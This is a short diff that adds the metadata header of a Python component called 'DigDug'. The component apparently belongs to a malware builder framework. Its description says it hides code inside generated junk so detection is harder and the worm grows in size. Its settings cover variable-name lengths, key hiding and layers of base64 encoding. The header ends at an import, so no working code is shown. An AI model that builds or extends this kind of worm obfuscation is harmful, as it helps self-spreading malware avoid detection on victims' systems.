@@ -1,0 +1,13 @@
+#!name##DigDug
+#!itemType##shadow
+#!hiveType##PySh
+#!info##Hides code in generated junk code making it harder to find. It creates a table from which it gradually builds code. Adds a great deal of code which will increase the size of the worm.
+#!lang##python
+#!Var##DIG_vlen##32##The base number of characters used to generate names for variables.##int
+#!Var##DIG_klen##32##Number of 'key' characters in the character table. The more characters, the harder it is to identify the key.##int
+#!Var##DIG_mkey##12##Base value for the number of elements generated to hide the key.##int
+#!Var##DIG_rcount##8##Number of base64 encodings used for the function that builds the code.##int
+
+
+
+import base64
